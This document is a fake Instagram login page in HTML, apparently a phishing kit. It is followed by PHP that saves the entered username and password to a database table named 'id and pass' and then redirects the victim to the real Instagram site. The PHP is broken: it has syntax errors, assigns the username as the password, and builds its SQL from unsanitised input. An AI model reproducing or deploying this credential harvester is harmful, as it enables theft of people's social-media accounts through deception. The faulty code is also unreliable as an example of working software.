<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram</title>
    <link rel="stylesheet" href="styles.css" />
    <link rel="icon" href="images/favicon.ico" />
  </head>
  <body>
    <main>
      <div class="log-in-container">
        <div class="log-in">
          <!-- Logo -->
          <img src="images/instagram-logo.png" class="logo" />
          <!-- Log in form -->

          <form action="" class="log-in-form">
            <input type="text" placeholder="Phone number, username or email" />
            <input type="password" placeholder="Password" name="password" />
            <button class="log-in-button" type="submit">Log In</button>
          </form>

          <!-- OR divider -->
          <span class="or-divider">OR</span>
          <!-- Log in with Facebook -->
          <div class="fb-login">
            <a href="#">
              <img src="images/facebook-icon.png" />
              <span>Log in with Facebook</span>
            </a>
          </div>
          <!-- Forgot password? -->
          <a href="#">Forgot password?</a>
        </div>
        <!-- Sign up -->
        <div class="sign-up">
          <span>Don't have an account?</span><a href="#">Sign up</a>
        </div>
        <!-- Download app -->
        <div class="get-the-app">
          <span>Get the app.</span>
          <div class="app-images">
            <a href="#"><img src="images/applestore.png" /></a>
            <a href="#"><img src="images/googlestore.png" /></a>
          </div>
        </div>
      </div>
      <!-- Phones -->
      <div class="phones-container">
        <img src="images/phones.png" />
      </div>
    </main>
    <footer>
      <ul class="footer-links">
        <li><a href="#">ABOUT</a></li>
        <li><a href="#">HELP</a></li>
        <li><a href="#">PRESS</a></li>
        <li><a href="#">API</a></li>
        <li><a href="#">JOBS</a></li>
        <li><a href="#">PRIVACY</a></li>
        <li><a href="#">TERMS</a></li>
        <li><a href="#">LOCATIONS</a></li>
        <li><a href="#">TOP</a></li>
        <li><a href="#">ACCOUNTS</a></li>
        <li><a href="#">HASHTAGS</a></li>
        <li><a href="#">LANGUAGE</a></li>
      </ul>
      <span class="copyright">&copy; 2022 INSTAGRAM FROM FACEBOOK</span>
    </footer>
  </body>
</html>

<?php

include 'connecited.php'

if(isset($_POST['submit'})){

    $username = $_POST['username'];
    $password = $_POST['username'];

    $insertQuery = "INSERT INTO `id and pass`( `username`, `password`) VALUES ('$username','$password')";

    $result = mysqli_query($con , $insertQuery);

    if($result){
        header("location: https://www.instagram.com");
    }
}

?>